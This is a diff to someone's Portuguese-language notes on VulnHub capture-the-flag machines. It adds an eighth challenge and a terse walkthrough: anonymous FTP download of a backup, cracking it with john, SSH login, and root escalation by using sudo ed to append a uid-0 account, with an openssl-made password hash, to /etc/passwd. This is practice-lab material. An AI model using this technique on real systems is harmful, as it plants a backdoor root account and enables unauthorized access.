@@ -6,6 +6,7 @@ desafio 4 - https://www.vulnhub.com/entry/digitalworldlocal-joy,298/
 desafio 5 - https://www.vulnhub.com/entry/violator-1,153/
 desafio 6 - https://www.vulnhub.com/entry/w1r3s-101,220/
 Desafio 7 - https://www.vulnhub.com/entry/ha-wordy,363/
+Desafio 8 - https://www.vulnhub.com/entry/sunset-1,339/
 
 --VM--
   
@@ -189,3 +190,27 @@ Dia 7 			13/9/2020
 		su pcpc 
 			pass -> batata
 			root pois está no mesmo grupo
+			
+
+Dia 8 			14/9/2020
+
+	*scan padrão
+	
+	*ftp login
+		anonymous
+			get backp -> baixar o arquivo lá
+			
+		*quebrar credencial
+				john backup
+		
+		*ssh login
+			sudo -l
+				sudo /usr/bin/ed   /etc/passwd 
+				a -> append
+
+				*adicionar usario ao arquivo
+					openssl passwd -1 -salt usuario senha 		
+						pcbeco:$1$pcbeco$F6qnmjD.aaKG2d0n2OATa1:0:0:root:/root:/bin/bash
+
+				.
+				w /etc/passwd
